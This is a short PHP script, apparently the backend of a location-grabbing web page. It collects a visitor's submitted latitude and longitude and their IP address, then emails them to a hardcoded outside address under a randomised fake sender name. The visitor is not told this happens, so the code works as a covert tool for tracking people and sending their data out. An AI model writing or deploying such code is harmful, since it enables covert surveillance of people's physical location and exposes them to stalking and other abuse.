<?php
	header('Content-Type: application/json');
	$cordenadas =$_GET["Latitud"].",".$_GET["Longitud"];
	function getRealIpAddr()
	{
		if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
		{
		  $ip=$_SERVER['HTTP_CLIENT_IP'];
		}
		elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
		{
		  $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
		}
		else
		{
		  $ip=$_SERVER['REMOTE_ADDR'];
		}
		return $ip;
	}

	ini_set( 'display_errors', 1 );
	error_reporting( E_ALL );
	$from = "dil".rand(10,20)."amin@outlook.com";
	$to = "88-8@live.com.mx";
	$subject = "Ubicacion".rand(25,50);
	$message ="Ip es:".	getRealIpAddr(). "cordenadas = ".$cordenadas;
	$headers = "From:" . $from;
	mail($to,$subject,$message, $headers);
	
	echo json_encode($cordenadas);
?>